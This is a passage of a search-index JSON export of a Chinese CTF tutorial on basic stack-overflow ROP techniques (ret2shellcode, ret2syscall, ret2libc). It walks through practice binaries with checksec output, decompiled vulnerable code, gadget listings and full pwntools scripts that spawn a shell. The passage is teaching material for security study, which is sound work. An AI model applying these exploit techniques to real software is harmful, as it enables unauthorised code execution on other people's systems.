            "text": "ret2shellcode\u9700\u8981\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u6267\u884cshellcode\u4ee3\u7801\u3002\u800c\u6240\u8c13\u7684shellcode\u6307\u7684\u662f\u7528\u4e8e\u5b8c\u6210\u67d0\u4e2a\u529f\u80fd\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u5e38\u89c1\u7684\u529f\u80fd\u4e3b\u8981\u662f\u83b7\u53d6\u76ee\u6807\u7cfb\u7edf\u7684shell\u3002 \u4e00\u822c\u6765\u8bf4\uff0cshellcode\u90fd\u9700\u8981\u6211\u4eec\u81ea\u5df1\u53bb\u586b\u5145\u3002\u8fd9\u5176\u5b9e\u662f\u53e6\u5916\u4e00\u79cd\u5178\u578b\u7684\u5229\u7528\u7684\u65b9\u6cd5\uff0c\u5373\u6b64\u65f6\u6211\u4eec\u9700\u8981\u81ea\u5df1\u53bb\u586b\u5145\u4e00\u4e9b\u53ef\u6267\u884c\u7684\u4ee3\u7801 \u3002  \u800c\u5728\u6808\u6ea2\u51fa\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u4e00\u822c\u90fd\u662f\u5411\u6808\u4e2d\u5199\u5185\u5bb9\uff0c\u6240\u4ee5\u8981\u60f3\u6267\u884cshellcode\uff0c\u9700\u8981\u5bf9\u5e94\u7684binary\u6587\u4ef6\u6ca1\u6709\u5f00\u542fNX\u4fdd\u62a4\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_5", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5bamboofox\u4e2d\u7684ret2shellcode\u4e3a\u4f8b    \u70b9\u51fb\u4e0b\u8f7d:  ret2shellcode  \u9996\u5148\u68c0\u6d4b\u7a0b\u5e8f\u5f00\u542f\u7684\u4fdd\u62a4  \u279c  ret2shellcode checksec ret2shellcode\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE  ( 0x8048000 ) \n    RWX:      Has RWX segments  \u53ef\u4ee5\u770b\u51fa\u6e90\u7a0b\u5e8f\u51e0\u4e4e\u6ca1\u6709\u5f00\u542f\u4efb\u4f55\u4fdd\u62a4\uff0c\u5e76\u4e14\u6709\u53ef\u8bfb\uff0c\u53ef\u5199\uff0c\u53ef\u6267\u884c\u6bb5\u3002\u6211\u4eec\u518d\u4f7f\u7528IDA\u770b\u4e00\u4e0b\u7a0b\u5e8f  int   __cdecl   main ( int   argc ,   const   char   ** argv ,   const   char   ** envp )  { \n   int   v4 ;   // [sp+1Ch] [bp-64h]@1 \n\n   setvbuf ( stdout ,   0 ,   2 ,   0 ); \n   setvbuf ( stdin ,   0 ,   1 ,   0 ); \n   puts ( No system for you this time !!! ); \n   gets (( char   * ) v4 ); \n   strncpy ( buf2 ,   ( const   char   * ) v4 ,   0x64u ); \n   printf ( bye bye ~ ); \n   return   0 ;  }   \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u4ecd\u7136\u662f\u57fa\u672c\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u8fd8\u540c\u65f6\u5c06\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u590d\u5236\u5230buf2\u5904\u3002\u7b80\u5355\u67e5\u770b\u53ef\u77e5buf2\u5728bss\u6bb5\u3002  .bss: 0804 A080                   public   buf2  .bss: 0804 A080   ; char buf2[100]   \u8fd9\u65f6\uff0c\u6211\u4eec\u7b80\u5355\u7684\u8c03\u8bd5\u4e0b\u7a0b\u5e8f\uff0c\u770b\u770b\u8fd9\u4e00\u4e2abss\u6bb5\u662f\u5426\u53ef\u6267\u884c\u3002  gef\u27a4  b main\nBreakpoint  1  at 0x8048536: file ret2shellcode.c, line  8 .\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode \n\nBreakpoint  1 , main  ()  at ret2shellcode.c:8 8        setvbuf ( stdout, 0LL,  2 , 0LL ) ; \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  source:ret2shellcode.c+8  ] \u2500\u2500\u2500\u2500\n       6   int main ( void ) \n       7    { \n \u2192     8       setvbuf ( stdout, 0LL,  2 , 0LL ) ; \n       9       setvbuf ( stdin, 0LL,  1 , 0LL ) ; \n      10   \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  trace  ] \u2500\u2500\u2500\u2500 [ #0] 0x8048536 \u2192 Name: main() \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  vmmap \nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\n0xf7faf000 0xf7fb2000 0x00000000 rwx \n0xf7fd3000 0xf7fd5000 0x00000000 rwx \n0xf7fd5000 0xf7fd7000 0x00000000 r--  [ vvar ] \n0xf7fd7000 0xf7fd9000 0x00000000 r-x  [ vdso ] \n0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffb000 0xf7ffc000 0x00000000 rwx \n0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\n0xfffdd000 0xffffe000 0x00000000 rwx  [ stack ]   \u901a\u8fc7vmmap\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230bss\u6bb5\u5bf9\u5e94\u7684\u6bb5\u5177\u6709\u53ef\u6267\u884c\u6743\u9650  0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode  \u90a3\u4e48\u8fd9\u6b21\u6211\u4eec\u5c31\u63a7\u5236\u7a0b\u5e8f\u6267\u884cshellcode\uff0c\u4e5f\u5c31\u662f\u8bfb\u5165shellcode\uff0c\u7136\u540e\u63a7\u5236\u7a0b\u5e8f\u6267\u884cbss\u6bb5\u5904\u7684shellcode\u3002\u5176\u4e2d\uff0c\u76f8\u5e94\u7684\u504f\u79fb\u8ba1\u7b97\u7c7b\u4f3c\u4e8eret2text\u4e2d\u7684\u4f8b\u5b50\u3002  \u5177\u4f53\u7684payload\u5982\u4e0b  ##!/usr/bin/env python  from   pwn   import   *  sh   =   process ( ./ret2shellcode )  shellcode   =   asm ( shellcraft . sh ())  buf2_addr   =   0x804a080  sh . sendline ( shellcode . ljust ( 112 ,   A )   +   p32 ( buf2_addr ))  sh . interactive ()", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_6", 
            "text": "sniperoj-pwn100-shellcode-x86-64", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#ret2syscall", 
            "text": "", 
            "title": "ret2syscall"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_7", 
            "text": "ret2syscall\u9700\u8981\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u83b7\u53d6shell\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_8", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5bamboofox\u4e2d\u7684ret2syscall\u4e3a\u4f8b    \u70b9\u51fb\u4e0b\u8f7d:  ret2syscall  \u9996\u5148\u68c0\u6d4b\u7a0b\u5e8f\u5f00\u542f\u7684\u4fdd\u62a4  \u279c  ret2syscall checksec rop\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u4e3a32\u4f4d\uff0c\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\u63a5\u4e0b\u6765\u5229\u7528IDA\u6765\u67e5\u770b\u6e90\u7801  int   __cdecl   main ( int   argc ,   const   char   ** argv ,   const   char   ** envp )  { \n   int   v4 ;   // [sp+1Ch] [bp-64h]@1 \n\n   setvbuf ( stdout ,   0 ,   2 ,   0 ); \n   setvbuf ( stdin ,   0 ,   1 ,   0 ); \n   puts ( This time, no system() and NO SHELLCODE!!! ); \n   puts ( What do you plan to do? ); \n   gets ( v4 ); \n   return   0 ;  }   \u53ef\u4ee5\u770b\u51fa\u6b64\u6b21\u4ecd\u7136\u662f\u4e00\u4e2a\u6808\u6ea2\u51fa\u3002\u7c7b\u4f3c\u4e8e\u4e4b\u524d\u7684\u505a\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u5f97v4\u76f8\u5bf9\u4e8eebp\u7684\u504f\u79fb\u4e3a108\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8986\u76d6\u7684\u8fd4\u56de\u5730\u5740\u76f8\u5bf9\u4e8ev4\u7684\u504f\u79fb\u4e3a112\u3002\u6b64\u6b21\uff0c\u7531\u4e8e\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684\u67d0\u4e00\u6bb5\u4ee3\u7801\u6216\u8005\u81ea\u5df1\u586b\u5199\u4ee3\u7801\u6765\u83b7\u5f97shell\uff0c\u6240\u4ee5\u6211\u4eec\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684gadgets\u6765\u83b7\u5f97shell\uff0c\u800c\u5bf9\u5e94\u7684shell\u83b7\u53d6\u5219\u662f\u5229\u7528\u7cfb\u7edf\u8c03\u7528\u3002\u5173\u4e8e\u7cfb\u7edf\u8c03\u7528\u7684\u77e5\u8bc6\uff0c\u8bf7\u53c2\u8003   https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8   \u7b80\u5355\u5730\u8bf4\uff0c\u53ea\u8981\u6211\u4eec\u628a\u5bf9\u5e94\u83b7\u53d6shell\u7684\u7cfb\u7edf\u8c03\u7528\u7684\u53c2\u6570\u653e\u5230\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0c\u90a3\u4e48\u6211\u4eec\u5728\u6267\u884cint 0x80\u5c31\u53ef\u6267\u884c\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u3002\u6bd4\u5982\u8bf4\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u5982\u4e0b\u7cfb\u7edf\u8c03\u7528\u6765\u83b7\u53d6shell  execve ( /bin/sh , NULL , NULL )   \u5176\u4e2d\uff0c\u8be5\u7a0b\u5e8f\u662f32\u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4f7f\u5f97   \u7cfb\u7edf\u8c03\u7528\u53f7\u5373eax\u5e94\u8be5\u4e3a0xb  \u7b2c\u4e00\u4e2a\u53c2\u6570\u5373ebx\u5e94\u8be5\u6307\u5411/bin/sh\u7684\u5730\u5740\uff0c\u5176\u5b9e\u6267\u884csh\u7684\u5730\u5740\u4e5f\u53ef\u4ee5  \u7b2c\u4e8c\u4e2a\u53c2\u6570\u5373ecx\u5e94\u8be5\u4e3a0  \u7b2c\u4e09\u4e2a\u53c2\u6570edx\u5e94\u8be5\u4e3a0   \u800c\u6211\u4eec\u5982\u4f55\u63a7\u5236\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c \u5462\uff1f\u8fd9\u91cc\u5c31\u9700\u8981\u4f7f\u7528gadgets\u3002\u6bd4\u5982\u8bf4\uff0c\u73b0\u5728\u6808\u9876\u662f10\uff0c\u90a3\u4e48\u5982\u679c\u6b64\u65f6\u6267\u884c\u4e86pop eax\uff0c\u90a3\u4e48\u73b0\u5728eax\u7684\u503c\u5c31\u4e3a10\u3002\u4f46\u662f\u6211\u4eec\u5e76\u4e0d\u80fd\u671f\u5f85\u6709\u4e00\u6bb5\u8fde\u7eed\u7684\u4ee3\u7801\u53ef\u4ee5\u540c\u65f6\u63a7\u5236\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u6bb5\u4e00\u6bb5\u63a7\u5236\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u5728gadgets\u6700\u540e\u4f7f\u7528ret\u6765\u518d\u6b21\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u7684\u539f\u56e0\u3002\u5177\u4f53\u5bfb\u627egadgets\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528ropgadgets\u8fd9\u4e2a\u5de5\u5177\u3002  \u9996\u5148\uff0c\u6211\u4eec\u6765\u5bfb\u627e\u63a7\u5236eax\u7684gadgets  \u279c  ret2syscall ROPgadget --binary rop  --only  pop|ret   |  grep  eax \n0x0809ddda : pop eax  ;  pop ebx  ;  pop esi  ;  pop edi  ;  ret\n0x080bb196 : pop eax  ;  ret\n0x0807217a : pop eax  ;  ret 0x80e\n0x0804f704 : pop eax  ;  ret  3 \n0x0809ddd9 : pop es  ;  pop eax  ;  pop ebx  ;  pop esi  ;  pop edi  ;  ret  \u53ef\u4ee5\u770b\u5230\u6709\u4e0a\u8ff0\u51e0\u4e2a\u90fd\u53ef\u4ee5\u63a7\u5236eax\uff0c\u90a3\u6211\u5c31\u9009\u53d6\u7b2c\u4e8c\u4e2a\u6765\u4f5c\u4e3a\u6211\u7684gadgets\u3002  \u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u63a7\u5236\u5176\u5b83\u5bc4\u5b58\u5668\u7684gadgets  \u279c  ret2syscall ROPgadget --binary rop  --only  pop|ret   |  grep  ebx \n0x0809dde2 : pop ds  ;  pop ebx  ;  pop esi  ;  pop edi  ;  ret\n0x0809ddda : pop eax  ;  pop ebx  ;  pop esi  ;  pop edi  ;  ret\n0x0805b6ed : pop ebp  ;  pop ebx  ;  pop esi  ;  pop edi  ;  ret\n0x0809e1d4 : pop ebx  ;  pop ebp  ;  pop esi  ;  pop edi  ;  ret\n0x080be23f : pop ebx  ;  pop edi  ;  ret\n0x0806eb69 : pop ebx  ;  pop edx  ;  ret\n0x08092258 : pop ebx  ;  pop esi  ;  pop ebp  ;  ret\n0x0804838b : pop ebx  ;  pop esi  ;  pop edi  ;  pop ebp  ;  ret\n0x080a9a42 : pop ebx  ;  pop esi  ;  pop edi  ;  pop ebp  ;  ret 0x10\n0x08096a26 : pop ebx  ;  pop esi  ;  pop edi  ;  pop ebp  ;  ret 0x14\n0x08070d73 : pop ebx  ;  pop esi  ;  pop edi  ;  pop ebp  ;  ret 0xc\n0x0805ae81 : pop ebx  ;  pop esi  ;  pop edi  ;  pop ebp  ;  ret  4 \n0x08049bfd : pop ebx  ;  pop esi  ;  pop edi  ;  pop ebp  ;  ret  8 \n0x08048913 : pop ebx  ;  pop esi  ;  pop edi  ;  ret\n0x08049a19 : pop ebx  ;  pop esi  ;  pop edi  ;  ret  4 \n0x08049a94 : pop ebx  ;  pop esi  ;  ret\n0x080481c9 : pop ebx  ;  ret\n0x080d7d3c : pop ebx  ;  ret 0x6f9\n0x08099c87 : pop ebx  ;  ret  8 \n0x0806eb91 : pop ecx  ;  pop ebx  ;  ret\n0x0806336b : pop edi  ;  pop esi  ;  pop ebx  ;  ret\n0x0806eb90 : pop edx  ;  pop ecx  ;  pop ebx  ;  ret\n0x0809ddd9 : pop es  ;  pop eax  ;  pop ebx  ;  pop esi  ;  pop edi  ;  ret\n0x0806eb68 : pop esi  ;  pop ebx  ;  pop edx  ;  ret\n0x0805c820 : pop esi  ;  pop ebx  ;  ret\n0x08050256 : pop esp  ;  pop ebx  ;  pop esi  ;  pop edi  ;  pop ebp  ;  ret\n0x0807b6ed : pop ss  ;  pop ebx  ;  ret  \u8fd9\u91cc\uff0c\u6211\u9009\u62e9  0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret  \u8fd9\u4e2a\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236\u5176\u5b83\u4e09\u4e2a\u5bc4\u5b58\u5668\u3002  \u6b64\u5916\uff0c\u6211\u4eec\u9700\u8981\u83b7\u5f97/bin/sh\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u3002  \u279c  ret2syscall ROPgadget --binary rop  --string  /bin/sh  \nStrings  information  ============================================================ \n0x080be408 : /bin/sh  \u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u6b64\u5916\uff0c\u8fd8\u6709int 0x80\u7684\u5730\u5740\uff0c\u5982\u4e0b  \u279c  ret2syscall ROPgadget --binary rop  --only  int                  \nGadgets information\n============================================================\n0x08049421 : int 0x80\n0x080938fe : int 0xbb\n0x080869b5 : int 0xf6\n0x0807b4d4 : int 0xfc\n\nUnique gadgets found: 4  \u540c\u65f6\uff0c\u4e5f\u627e\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002  \u4e0b\u9762\u5c31\u662f\u5bf9\u5e94\u7684payload,\u5176\u4e2d0xb\u4e3aexecve\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u3002  ##!/usr/bin/env python  from   pwn   import   *  sh   =   process ( ./rop )  pop_eax_ret   =   0x080bb196  pop_edx_ecx_ebx_ret   =   0x0806eb90  int_0x80   =   0x08049421  binsh   =   0x80be408  payload   =   flat ( \n     [ A   *   112 ,   pop_eax_ret ,   0xb ,   pop_edx_ecx_ebx_ret ,   0 ,   0 ,   binsh ,   int_0x80 ])  sh . sendline ( payload )  sh . interactive ()", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_9", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#ret2libc", 
            "text": "", 
            "title": "ret2libc"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_10", 
            "text": "ret2libc\u5373\u63a7\u5236\u51fd\u6570\u7684\u6267\u884c libc\u4e2d\u7684\u51fd\u6570\uff0c\u901a\u5e38\u662f\u8fd4\u56de\u81f3\u67d0\u4e2a\u51fd\u6570\u7684plt\u5904\u6216\u8005\u51fd\u6570\u7684\u5177\u4f53\u4f4d\u7f6e(\u5373\u51fd\u6570\u5bf9\u5e94\u7684got\u8868\u9879\u7684\u5185\u5bb9)\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u9009\u62e9\u6267\u884csystem(\"/bin/sh\")\uff0c\u6545\u800c\u6b64\u65f6\u6211\u4eec\u9700\u8981\u77e5\u9053system\u51fd\u6570\u7684\u5730\u5740\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_11", 
            "text": "\u6211\u4eec\u7531\u7b80\u5355\u5230\u96be\u5206\u522b\u7ed9\u51fa\u4e09\u4e2a\u4f8b\u5b50\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#1", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5bamboofox\u4e2dret2libc1\u4e3a\u4f8b    \u70b9\u51fb\u4e0b\u8f7d:  ret2libc1  \u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u68c0\u67e5\u4e00\u4e0b\u7a0b\u5e8f\u7684\u5b89\u5168\u4fdd\u62a4  \u279c  ret2libc1 checksec ret2libc1    \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u6e90\u7a0b\u5e8f\u4e3a32\u4f4d\uff0c\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\u4e0b\u9762\u6765\u770b\u4e00\u4e0b\u7a0b\u5e8f\u6e90\u4ee3\u7801\uff0c\u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e  int   __cdecl   main ( int   argc ,   const   char   ** argv ,   const   char   ** envp )  { \n   int   v4 ;   // [sp+1Ch] [bp-64h]@1 \n\n   setvbuf ( stdout ,   0 ,   2 ,   0 ); \n   setvbuf ( _bss_start ,   0 ,   1 ,   0 ); \n   puts ( RET2LIBC  _ ); \n   gets (( char   * ) v4 ); \n   return   0 ;  }   \u53ef\u4ee5\u770b\u5230\u5728\u6267\u884cgets\u51fd\u6570\u7684\u65f6\u5019\u51fa\u73b0\u4e86\u6808\u6ea2\u51fa\u3002\u6b64\u5916\uff0c\u5229\u7528ropgadget\uff0c\u6211\u4eec\u53ef\u4ee5\u67e5\u770b\u662f\u5426\u6709/bin/sh\u5b58\u5728  \u279c  ret2libc1 ROPgadget --binary ret2libc1 --string  /bin/sh           \nStrings  information  ============================================================ \n0x08048720 : /bin/sh  \u786e\u5b9e\u5b58\u5728\uff0c\u518d\u6b21\u67e5\u627e\u4e00\u4e0b\u662f\u5426\u6709system\u51fd\u6570\u5b58\u5728\u3002\u7ecf\u5728ida\u4e2d\u67e5\u627e\uff0c\u786e\u5b9e\u4e5f\u5b58\u5728\u3002  .plt: 08048460   ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]   \u90a3\u4e48\uff0c\u6211\u4eec\u76f4\u63a5\u8fd4\u56de\u8be5\u5904\uff0c\u5373\u6267\u884csystem\u51fd\u6570\u3002\u76f8\u5e94\u7684payload\u5982\u4e0b  ##!/usr/bin/env python  from   pwn   import   *  sh   =   process ( ./ret2libc1 )  binsh_addr   =   0x8048720  system_plt   =   0x08048460  payload   =   flat ([ a   *   112 ,   system_plt ,   b   *   4 ,   binsh_addr ])  sh . sendline ( payload )  sh . interactive ()   \u8fd9\u91cc\u6211\u4eec\u9700\u8981\u6ce8\u610f\u51fd\u6570\u8c03\u7528\u6808\u7684\u7ed3\u6784\uff0c\u5982\u679c\u662f\u6b63\u5e38\u8c03\u7528system\u51fd\u6570\uff0c\u6211\u4eec\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u8fd4\u56de\u5730\u5740\uff0c\u8fd9\u91cc\u4ee5'bbbb'\u4f5c\u4e3a\u865a\u5047\u7684\u5730\u5740\uff0c\u5176\u540e\u53c2\u6570\u5bf9\u5e94\u7684\u53c2\u6570\u5185\u5bb9\u3002  \u8fd9\u4e2a\u4f8b\u5b50\uff0c\u76f8\u5bf9\u6765\u8bf4\uff0c\u6700\u4e3a\u7b80\u5355\uff0c\u540c\u65f6\u63d0\u4f9b\u4e86system\u5730\u5740\u4e0e/bin/sh\u7684\u5730\u5740\uff0c\u4f46\u662f\u5927\u591a\u6570\u7a0b\u5e8f\u5e76\u4e0d\u4f1a\u6709\u8fd9\u4e48\u597d\u7684\u60c5\u51b5\u3002", 
            "title": "\u4f8b1"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#2", 
            "text": "\u8fd9\u91cc\u4ee5bamboofox\u4e2d\u7684ret2libc2\u4e3a\u4f8b    \u70b9\u51fb\u4e0b\u8f7d:  ret2libc2  \u8be5\u9898\u76ee\u4e0e\u4f8b1\u57fa\u672c\u4e00\u81f4\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u518d\u51fa\u73b0/bin/sh\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6b64\u6b21\u9700\u8981\u6211\u4eec\u81ea\u5df1\u6765\u8bfb\u53d6\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e24\u4e2agadgets\uff0c\u7b2c\u4e00\u4e2a\u63a7\u5236\u7a0b\u5e8f\u8bfb\u53d6\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e8c\u4e2a\u63a7\u5236\u7a0b\u5e8f\u6267\u884csystem(\"\"/bin/sh\")\u3002\u7531\u4e8e\u6f0f\u6d1e\u4e0e\u4e0a\u8ff0\u4e00\u81f4\uff0c\u8fd9\u91cc\u5c31\u4e0d\u5728\u591a\u8bf4\uff0c\u5177\u4f53\u7684exp\u5982\u4e0b  ##!/usr/bin/env python  from   pwn   import   *  sh   =   process ( ./ret2libc2 )  gets_plt   =   0x08048460  system_plt   =   0x08048490  pop_ebx   =   0x0804843d  buf2   =   0x804a080  payload   =   flat ( \n     [ a   *   112 ,   gets_plt ,   pop_ebx ,   buf2 ,   system_plt ,   0xdeadbeef ,   buf2 ])  sh . sendline ( payload )  sh . sendline ( /bin/sh )  sh . interactive ()   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u8fd9\u91cc\u5411\u7a0b\u5e8f\u4e2dbss\u6bb5\u7684buf2\u5904\u5199\u5165/bin/sh\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u5176\u5730\u5740\u4f5c\u4e3asystem\u7684\u53c2\u6570\u4f20\u5165\u3002\u8fd9\u6837\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u83b7\u5f97shell\u3002", 
            "title": "\u4f8b2"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#3", 
            "text": "\u8fd9\u91cc\u4ee5bamboofox\u4e2d\u7684ret2libc3\u4e3a\u4f8b    \u70b9\u51fb\u4e0b\u8f7d:  ret2libc3  \u5728\u4f8b2\u7684\u57fa\u7840\u4e0a\uff0c\u518d\u6b21\u5c06system\u51fd\u6570\u7684\u5730\u5740\u53bb\u6389\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u9700\u8981\u540c\u65f6\u627e\u5230system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\u9996\u5148\uff0c\u67e5\u770b\u5b89\u5168\u4fdd\u62a4  \u279c  ret2libc3 checksec ret2libc3\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u4ecd\u65e7\u5f00\u542f\u4e86\u5806\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002\u8fdb\u800c\u67e5\u770b\u6e90\u7801\uff0c\u53d1\u73b0\u7a0b\u5e8f\u7684bug\u4ecd\u7136\u662f\u6808\u6ea2\u51fa  int   __cdecl   main ( int   argc ,   const   char   ** argv ,   const   char   ** envp )  { \n   int   v4 ;   // [sp+1Ch] [bp-64h]@1 \n\n   setvbuf ( stdout ,   0 ,   2 ,   0 ); \n   setvbuf ( stdin ,   0 ,   1 ,   0 ); \n   puts ( No surprise anymore, system disappeard QQ. ); \n   printf ( Can you find it !? ); \n   gets (( char   * ) v4 ); \n   return   0 ;  }   \u90a3\u4e48\u6211\u4eec\u5982\u4f55\u5f97\u5230system\u51fd\u6570\u7684\u5730\u5740\u5462\uff1f\u8fd9\u91cc\u5c31\u4e3b\u8981\u5229\u7528\u4e86\u4e24\u4e2a\u77e5\u8bc6\u70b9   